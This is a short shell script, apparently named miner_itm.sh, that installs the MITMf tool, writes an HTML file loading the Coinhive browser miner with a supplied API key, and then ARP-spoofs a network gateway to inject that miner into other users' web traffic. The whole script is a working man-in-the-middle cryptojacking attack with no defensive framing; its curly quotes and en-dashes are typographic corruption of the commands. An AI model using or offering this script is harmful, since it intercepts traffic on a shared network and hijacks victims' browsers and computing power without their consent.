if [ $# -eq “3” ]     then

apt-get update -y

apt-get install mitmf -y

pip install Twisted==15.5.0

echo “<script src=”https://coinhive.com/lib/coinhive.min.js”></script><script>var miner = new      CoinHive.Anonymous(‘”$1″‘);miner.start();</script>” > /root/.miner_itm.html

mitmf –inject –html-file /root/.miner_itm.html –spoof –arp –gateway $2 -i $3

else

echo “./miner_itm.sh <coinhive api key> <gateway ip> <interface name>”
fi